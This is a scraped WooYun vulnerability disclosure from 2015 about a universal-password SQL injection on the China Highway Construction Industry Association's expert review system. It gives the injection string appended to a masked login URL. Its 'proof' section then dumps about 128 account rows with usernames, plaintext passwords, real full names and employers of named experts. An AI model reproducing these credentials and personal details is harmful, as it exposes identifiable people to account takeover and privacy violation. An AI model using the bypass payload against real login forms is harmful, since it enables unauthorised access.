{"id": 71107, "wybug_id": "wooyun-2015-0132822", "wybug_title": "中国公路建设行业协会公路工程工法管理系统评审专家系统万能密码漏洞", "wybug_corp": "中国公路建设行业协会", "wybug_author": "时光love叶子", "wybug_date": "2015-08-12 15:54", "wybug_open_date": "2015-09-26 16:32", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-12：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向公众公开  简要描述： 中国公路建设行业协会公路工程工法管理系统评审专家系统万能密码漏洞 详细说明：  中国公路建设行业协会公路工程工法管理系统评审专家系统万能密码漏洞http://**.**.**.**/DKasp/Login.asp'or'1'='1   漏洞证明：  \nwooyun\twooyun\t乌云\t\t评审专家\t路基,路面,桥涵,隧道,交通工程,养护\t√\t查看详细\t编辑\t删除2\tyqh\t123456\t袁秋红\t中国公路建设行业协会\t评审委员会\t\t√\t查看详细\t编辑\t删除3\tgxq\tgxq859\t郭秀琴\t中铁十六局集团有限公司\t评审专家\t路基,路面,桥涵,隧道\t√\t查看详细\t编辑\t删除4\tggsl\t123456\t郭光松\t中交路桥建设有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除5\tlyq\t123456\t刘元泉\t中交第一公路工程局有限公司\t评审专家\t路基,路面,桥涵,隧道\t√\t查看详细\t编辑\t删除6\tsxd\t123456\t石新栋\t中交隧道工程局有限公司\t评审专家\t路基,隧道\t√\t查看详细\t编辑\t删除7\tzy\tzy88469\t卓越\t中铁隧道集团有限公司\t评审专家\t隧道\t√\t查看详细\t编辑\t删除8\txhp\t123456\t许和平\t中国铁建股份有限公司\t评审专家\t桥涵,隧道\t√\t查看详细\t编辑\t删除9\tzjb\tzjb1235\t张俊兵\t中铁三局集团有限公司\t评审专家\t桥涵\t√\t查看详细\t编辑\t删除10\tlyw\t123456\t刘元炜\t中交第三公路工程局有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除11\tcc\t123456\t陈超\t龙建路桥股份有限公司\t评审专家\t路基,路面,桥涵,隧道\t√\t查看详细\t编辑\t删除12\tggs\t123456\t葛钢锁\t中交第四公路工程局有限公司\t评审专家\t路基,路面,桥涵,养护\t√\t查看详细\t编辑\t删除13\tsgy\tsgy123456\t单光炎\t浙江省交通工程建设集团有限公司\t评审专家\t路基,路面,桥涵,养护\t√\t查看详细\t编辑\t删除14\tzws\t112233\t赵文声\t广东省长大公路工程有限公司\t评审专家\t路基,路面,交通工程\t√\t查看详细\t编辑\t删除15\tsxm\tsxm431\t孙西濛\t北京市政路桥股份有限公司总承包一部\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除16\tswl\t68052456\t孙文龙\t北京市政路桥股份有限公司\t评审专家\t路基,路面,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除17\tlcf\t123456\t李春风\t交通运输部公路局技术处\t评审委员会\t\t√\t查看详细\t编辑\t删除18\tscg\t123456\t单长刚\t中国公路建设行业协会\t评审委员会\t\t√\t查看详细\t编辑\t删除19\tzjc\t123456\t周纪昌\t中国公路建设行业协会\t评审委员会\t\t√\t查看详细\t编辑\t删除20\tlp\t123456\t刘鹏\t中国公路建设行业协会\t评审委员会\t\t√\t查看详细\t编辑\t删除21\tcsb\t123456\t程树本\t中国公路建设行业协会专家委员会\t评审专家\t路基,路面,养护\t√\t查看详细\t编辑\t删除22\tyy\t123456\t杨昀\t交通运输部公路科学研究院桥梁中心\t评审专家\t桥涵\t√\t查看详细\t编辑\t删除23\tlhz\t123456\t李红专\t北京城建道桥建设集团有限公司\t评审专家\t路基,路面,桥涵,隧道\t√\t查看详细\t编辑\t删除24\tljq\tzg1we1\t陆军强\t利越集团有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除25\tcgp\t123456\t陈国平\t浙江省大成建设集团有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除26\tghl\t123456\t管鹤楼\t江苏省镇江市路桥工程总公司\t评审专家\t路基,桥涵\t√\t查看详细\t编辑\t删除27\thzh\t123456\t郝振华\t内蒙古路桥有限责任公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除28\tdc\tdc6689\t杜 程\t辽宁省路桥建设集团有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除29\tzxf\t123456\t郑雪峰\t江西省交通工程集团公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除30\tjql\t123456\t贾佺利\t陕西路桥集团有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除31\ttjz\ttjz456\t田军祯\t山东省路桥集团有限公司\t评审专家\t路基,路面,桥涵,养护\t√\t查看详细\t编辑\t删除32\tzpj\tzpj9785\t张丕界\t中铁十一局集团有限公司\t评审专家\t路基,路面,隧道\t√\t查看详细\t编辑\t删除33\tssl\t123456\t沈顺柳\t中国公路工程咨询集团有限公司\\中咨华科公司\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除34\tlch\t123456\t廖朝华\t中交第二公路勘察设计研究院有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除35\tsd\t123456\t孙 东\t中铁二院贵阳有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除36\tcfx\t123456\t丛福祥\t鲲鹏建设集团有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除37\txzz\t123456\t夏志忠\t辽宁金帝路桥建设有限公司\t评审专家\t路面,桥涵,隧道\t√\t查看详细\t编辑\t删除38\tjwc\t123456\t姜文臣\t山东省临沂市农村公路养护中心山东沂蒙交通工程有限公司\t评审专家\t交通工程,养护\t√\t查看详细\t编辑\t删除39\tmfs\t123456\t孟福胜\t沧州路桥工程公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除40\tzlc\t123456\t朱连臣\t青岛建工集团有限公司\t评审专家\t路基\t√\t查看详细\t编辑\t删除41\tcgf\tcgf121\t储根法\t安徽省交通建设有限责任公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除42\tjhq\t123456\t贾海庆\t山东省公路建设（集团）有限公司\t评审专家\t路基,路面,交通工程\t√\t查看详细\t编辑\t删除43\tsj\t123456\t孙 杰\t济南城建集团有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除44\txg\t123456\t许 庚\t济南城建集团有限公司\t评审专家\t路基,桥涵\t√\t查看详细\t编辑\t删除45\tzxp\t123456\t郑小平\t河北建设集团有限公司路桥分公司\t评审专家\t路面,桥涵\t√\t查看详细\t编辑\t删除46\tjy\t123456\t金 奕\t北京城建集团有限责任公司土木工程总承包部\t评审专家\t路基,桥涵,交通工程\t√\t查看详细\t编辑\t删除47\tdlg\t123456\t董力光\t辽宁省路桥建设集团有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除48\twcx\t123456\t王成鑫\t内蒙古路桥有限责任公司\t评审专家\t路面,桥涵\t√\t查看详细\t编辑\t删除49\twsl\twsl665\t王树林\t广东冠粤路桥有限公司\t评审专家\t路基,路面,桥涵,隧道,交通工程\t×\t查看详细\t编辑\t删除50\trwh\t123456\t任文宏\t甘肃路桥建设集团有限公司\t评审专家\t路基,桥涵\t√\t查看详细\t编辑\t删除\n\n\n\n51\tckh\t123456\t陈克鸿\t广东能达高等级公路维护有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除52\tzlw\t123456\t曾利文\t广东省长大公路工程有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除53\twyx\twyx5598\t王应祥\t西南交通建设集团股份有限公司\t评审专家\t路基,路面,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除54\tlxc\t123456\t廖小春\t江西省交通工程集团公司\t评审专家\t隧道,交通工程\t√\t查看详细\t编辑\t删除55\tll\t123456\t刘林\t江苏省镇江市路桥工程总公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除56\tdwb\tdwb965\t董武斌\t四川公路桥梁建设集团有限公司\t评审专家\t路基,路面,桥涵,隧道,养护\t√\t查看详细\t编辑\t删除57\tliuyl\t5599190\t刘玉兰\t湖南路桥建设集团公司\t评审专家\t路基,路面,桥涵,交通工程,养护\t√\t查看详细\t编辑\t删除58\tfy\t123456\t冯 沅\t山西路桥建设集团有限公司\t评审专家\t桥涵,交通工程\t√\t查看详细\t编辑\t删除59\tydf\t123456\t颜东锋\t浙江省交通工程建设集团有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除60\tgjk\t123456\t高金康\t浙江省交通工程建设集团有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除61\tmy\t123456\t马 勇\t龙建路桥股份有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除62\tcyj\t123456\t陈彦君\t黑龙江省龙建路桥第五工程有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除63\tcsz\t123456\t蔡绍忠\t黑龙江省建设集团有限公司龙建路桥股份有限公司\t评审专家\t路基,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除64\tlgq\t123456\t李国清\t河北路桥集团有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除65\tzwj\tzwj668\t翟文静\t北京鑫实路桥建设有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除66\tzsm\t123456\t张素梅\t北京鑫实路桥建设有限公司\t评审专家\t桥涵,交通工程\t√\t查看详细\t编辑\t删除67\tpcr\t123456\t裴承润\t北京市政路桥股份有限公司工程总承包一部\t评审专家\t路基,桥涵,交通工程\t√\t查看详细\t编辑\t删除68\tlwh\t123456\t李文华\t北京市政路桥股份有限公司技术研发中心\t评审专家\t路基,路面,交通工程\t√\t查看详细\t编辑\t删除69\tzss\t123456\t周世生\t北京市政路桥股份有限公司技术研发中心\t评审专家\t路基,桥涵,交通工程\t√\t查看详细\t编辑\t删除70\tzq\t123456\t张 琼\t安徽省路港工程有限责任公司\t评审专家\t路基,隧道,交通工程\t√\t查看详细\t编辑\t删除71\tpsk\t123456\t彭申凯\t安徽省公路桥梁工程有限公司\t评审专家\t路基,路面,桥涵,隧道,交通工程,养护\t√\t查看详细\t编辑\t删除72\tfxy\tfxy669\t范训益\t中国建筑股份有限公司基础设施事业部\t评审专家\t路基,桥涵\t√\t查看详细\t编辑\t删除73\tlzh\t123456\t李植怀\t中国路桥工程有限责任公司\t评审专家\t路基,桥涵,交通工程\t√\t查看详细\t编辑\t删除74\tpr\t123456\t彭 锐\t中咨泰克交通工程集团有限公司\t评审专家\t路基\t√\t查看详细\t编辑\t删除75\tycw\tycw458\t杨昌维\t中交第二航务工程局有限公司\t评审专家\t路基,路面,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除76\twst\twst1235\t王书涛\t中交三公局第一工程有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除77\ttxp\t582202\t滕小平\t中交第三公路工程有限公司\t评审专家\t路基,路面,桥涵,交通工程,养护\t√\t查看详细\t编辑\t删除78\tyyh\t123456\t杨元海\t中交路桥建设有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除79\tyzp\t123456\t杨振平\t中交一航局第四工程有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除80\tlj\t123456\t李 俊\t中交一公局厦门工程有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除81\tyyr\t123456\t杨源荣\t中咨泰克交通工程集团有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除82\tsyg\tsyg3566\t孙耀国\t中国路桥工程有限责任公司\t评审专家\t路基,桥涵,交通工程\t√\t查看详细\t编辑\t删除83\tlsh\t123456\t李寿华\t中国交通建设股份有限公司总承包经营分公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除84\tczq\t123456\t陈中秋\t中国交通建设股份有限公司总承包经营分公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除85\tpsd\t123456\t潘寿东\t中铁十六局集团第三工程有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除86\tsqx\t123456\t沙权贤\t中铁十三局集团第一工程有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除87\tzxd\t123456\t张旭东\t中铁十一局集团有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除88\tlzw\t123456\t刘招伟\t中铁隧道集团有限公司\t评审专家\t路基,隧道,交通工程\t√\t查看详细\t编辑\t删除89\tdjh\t8598djh\t董炬洪\t中铁七局集团有限公司\t评审专家\t路基,路面,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除90\tzjf\t123456\t赵剑发\t中铁六局集团有限公司\t评审专家\t路基,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除91\tyzc\t123456\t闫子才\t中铁四局集团有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除92\thxj\t123456\t何贤军\t中铁四局集团有限公司\t评审专家\t路基,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除93\twzh\t123456\t王志辉\t山东交通学院\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除94\tzjl\t123456\t郑健龙\t长沙理工大学\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除95\tzcj\t123456\t周长军\t中国公路工程咨询集团有限公司\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除96\tsy\tsy3589\t宋 仪\t中铁隧道勘测设计院有限公司\t评审专家\t隧道,交通工程\t√\t查看详细\t编辑\t删除97\tpxr\t123456\t彭向荣\t广东省公路勘察规划设计院股份有限公司\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除98\tcfm\t123456\t陈发明\t新疆维吾尔自治区公路工程质量监督局\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除99\tty\t123456\t唐 颖\t福建省交通规划设计院\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除100\tcz\t123456\t陈 阵\t福建省交通规划设计院\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除\n\n\n\n101\tfeg\t123456\t冯尔钢\t山西省公路学会\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除102\tap\t123456\t安 平\t日照市公路管理局工程处\t评审专家\t桥涵,交通工程\t√\t查看详细\t编辑\t删除103\tzl\t123456\t张 亮\t湖南省交通科学研究院\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除104\tpyx\t123456\t彭贻希\t福建省交通科学技术研究所\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除105\tgxg\t123456\t高仙桂\t新疆维吾尔自治区交通建设管理局\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除106\twyg\t123456\t汪亚干\t交通运输部规划研究院\t评审专家\t路基,路面,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除107\tysz\t123456\t杨智生\t交通运输部规划研究院\t评审专家\t路基,路面,桥涵,隧道,交通工程\t√\t查看详细\t编辑\t删除108\tdzg\t123456\t杜佐光\t宏远建设有限公司\t评审专家\t路基,交通工程\t√\t查看详细\t编辑\t删除109\tlyl\tlyl123456\t李友林\t沧州路桥工程公司\t评审专家\t路基,路面,桥涵,交通工程\t×\t查看详细\t编辑\t删除110\tqw\tqw123456\t祁 伟\t甘肃路桥建设集团有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除111\tzbt\t123456\t张保同\t山东省路桥集团有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除112\tgfs\t123456\t郭法生\t中铁四局集团有限公司\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除113\twhm\t123456\t吴海民\t中交第四公路工程局有限公司\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除114\tqsj\t123456\t钱绍锦\t中交第三公路工程有限公司\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除115\tlcb\t123456\t罗承斌\t中交第二航务工程局有限公司\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除116\tgc\t123456\t高 春\t中交一航局总承包分公司\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除117\thxw\thxw6698\t黄学文\t安徽省高速公路控股集团有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除118\tjzs\t123456\t姜竹生\t江苏省交通运输厅工程质量监督局\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除119\tlxl\t123456\t吕锡岭\t浙江省大成建设集团有限公司西北分公司\t评审专家\t路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除120\tfdc\t123456\t傅道春\t山东交通学院土木工程学院\t评审专家\t交通工程\t√\t查看详细\t编辑\t删除121\tdep\t123456\t杜二鹏\t天津市市政公路管理局\t评审专家\t路面,交通工程\t√\t查看详细\t编辑\t删除122\tsxp\ty759mq\t邵新鹏\t山东高速青岛发展有限公司\t评审专家\t路基,路面,桥涵,交通工程\t√\t查看详细\t编辑\t删除123\tzxl\t61235\t周绪利\t北京市道路工程质量监督站\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除124\tlsz\t857132\t吕思忠\t山东省路桥集团有限公司\t评审专家\t路基,路面\t√\t查看详细\t编辑\t删除125\twzw\twzw4369\t王中文\t广东省长大公路工程有限公司\t评审专家\t路基,路面,桥涵,隧道\t√\t查看详细\t编辑\t删除126\tzh\t123456\t张鸿\t中交第二航务工程局有限公司\t评审专家\t路基,路面,桥涵\t√\t查看详细\t编辑\t删除127\thx\t546318\t黄新\t中铁上海局工程有限公司\t评审专家\t路基,桥涵,隧道\t√\t查看详细\t编辑\t删除128\twbq\t64283\t王保群\t山东交通学院土木工程学院\t评审专家\t桥涵,隧道\t√\t查看详细\t编辑\t删除\n图片就不需要更多了   修复方案：  ~~~~~~~~~~~~~~~~~~~~~~   版权声明：转载请注明来源 时光love叶子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-12 16:30 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给北京分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}